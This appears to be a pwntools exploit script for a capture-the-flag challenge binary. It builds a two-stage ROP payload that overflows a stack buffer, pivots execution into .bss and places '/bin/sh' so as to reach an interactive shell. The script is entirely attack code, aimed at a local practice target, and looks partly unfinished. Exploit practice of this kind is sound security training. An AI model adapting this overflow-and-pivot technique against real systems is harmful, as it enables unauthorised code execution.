from pwn import *

exe = context.binary = ELF("./chall")
r = process()
sleep(15)

rop = ROP(exe)
bss = 0x404040 + 0x100
offset = 264 - 8

# Build first stage payload
rop.raw(b"A" * offset)
rop.raw(bss)
rop.raw(0x401165)
rop.raw(0x401165)
rop.raw(0x401165)
rop.raw(b"B" * (4096 - len(rop.chain())))

# Save first stage chain
payload1 = rop.chain()

# Build second stage (to place at bss)
rop2 = ROP(exe)
rop2.raw(b"/bin/sh\x00")
rop2.raw(b"A" * (offset - 8))
rop2.raw(0x404140)
rop2.raw(0x401165)

# Save second stage chain
payload2 = rop2.chain()

# Combine both payloads
full_payload = payload1 + payload2

# Optional: write to file for debugging
write("payload", full_payload)

# Send full payload
# r.sendline(full_payload)
r.send(payload1)
r.send(payload2)
print(len(payload1))
r.interactive()
